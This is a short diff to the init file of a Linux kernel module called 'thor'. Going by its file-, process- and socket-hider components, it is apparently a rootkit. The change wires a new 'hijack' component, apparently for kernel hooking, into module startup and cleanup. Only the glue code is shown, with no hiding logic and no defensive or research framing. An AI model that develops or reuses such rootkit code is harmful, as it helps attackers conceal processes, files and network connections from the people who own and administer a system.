@@ -3,6 +3,7 @@
 
 #include "filehider.h"
 #include "helper.h"
+#include "hijack.h"
 #include "logging.h"
 #include "procfile.h"
 #include "prochider.h"
@@ -14,12 +15,17 @@ static void thor_cleanup(void)
     prochider_cleanup();
     filehider_cleanup();
     sockethider_cleanup();
+    hijack_cleanup();
     LOG_INFO("cleanup done");
 }
 
 static int __init thor_init(void)
 {
-    if (procfile_init() < 0 || prochider_init() < 0 || filehider_init() < 0 || sockethider_init() < 0) {
+    if (hijack_init() < 0 ||
+        procfile_init() < 0 ||
+        prochider_init() < 0 ||
+        filehider_init() < 0 ||
+        sockethider_init() < 0) {
         LOG_ERROR("failed to initialize");
         thor_cleanup();
         return -1;
